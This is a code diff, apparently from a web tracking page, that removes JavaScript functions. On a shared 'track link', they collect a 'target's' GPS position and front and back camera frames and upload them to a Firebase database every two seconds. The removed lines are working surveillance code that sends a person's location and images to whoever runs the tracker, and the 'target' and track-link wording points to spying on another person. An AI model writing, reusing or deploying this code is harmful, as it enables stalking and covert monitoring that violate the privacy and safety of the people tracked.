-        async function startTargetSharing() {
-            try {
-                // GPS
-                navigator.geolocation.getCurrentPosition(async (position) => {
-                    await database.ref('targets/' + currentTrackId).update({
-                        location: {
-                            lat: position.coords.latitude,
-                            lng: position.coords.longitude,
-                            accuracy: position.coords.accuracy,
-                            speed: position.coords.speed || 0
-                        },
-                        timestamp: Date.now()
-                    });
-                    document.getElementById('gpsStatus').className = 'status-badge status-success';
-                    document.getElementById('gpsStatus').innerHTML = '✅ Granted';
-                });
-                
-                // Front Camera
-                frontStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'user' } 
-                });
-                document.getElementById('frontCamStatus').className = 'status-badge status-success';
-                document.getElementById('frontCamStatus').innerHTML = '✅ Granted';
-                
-                // Back Camera
-                backStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'environment' } 
-                });
-                document.getElementById('backCamStatus').className = 'status-badge status-success';
-                document.getElementById('backCamStatus').innerHTML = '✅ Granted';
-                
-                // Start sending data
-                startSendingData();
-                
-            } catch (error) {
-                alert('Error: ' + error.message);
-            }
-        }
-        
-        // ============================================
-        // SEND DATA TO FIREBASE
-        // ============================================
-        function startSendingData() {
-            sharingInterval = setInterval(async () => {
-                // Send GPS
-                navigator.geolocation.getCurrentPosition(async (position) => {
-                    await database.ref('targets/' + currentTrackId).update({
-                        location: {
-                            lat: position.coords.latitude,
-                            lng: position.coords.longitude,
-                            accuracy: position.coords.accuracy,
-                            speed: position.coords.speed || 0
-                        },
-                        timestamp: Date.now()
-                    });
-                });
-                
-                // Send Front Camera
-                if (frontStream) {
-                    const video = document.createElement('video');
-                    video.srcObject = frontStream;
-                    await video.play();
-                    
-                    const canvas = document.createElement('canvas');
-                    canvas.width = 320;
-                    canvas.height = 240;
-                    canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
-                    
-                    const frontData = canvas.toDataURL('image/jpeg', 0.5);
-                    await database.ref('targets/' + currentTrackId).update({
-                        frontCamera: frontData
-                    });
-                }
-                
-                // Send Back Camera
-                if (backStream) {
-                    const video = document.createElement('video');
-                    video.srcObject = backStream;
-                    await video.play();
-                    
-                    const canvas = document.createElement('canvas');
-                    canvas.width = 320;
-                    canvas.height = 240;
-                    canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
-                    
-                    const backData = canvas.toDataURL('image/jpeg', 0.5);
-                    await database.ref('targets/' + currentTrackId).update({
-                        backCamera: backData
-                    });
-                }
-            }, 2000);
-        }
-        
-        // ============================================
-        // UTILITY FUNCTIONS
+        // UTILITY
         // ============================================
         function copyTrackLink() {
             const link = document.getElementById('trackLinkInput');
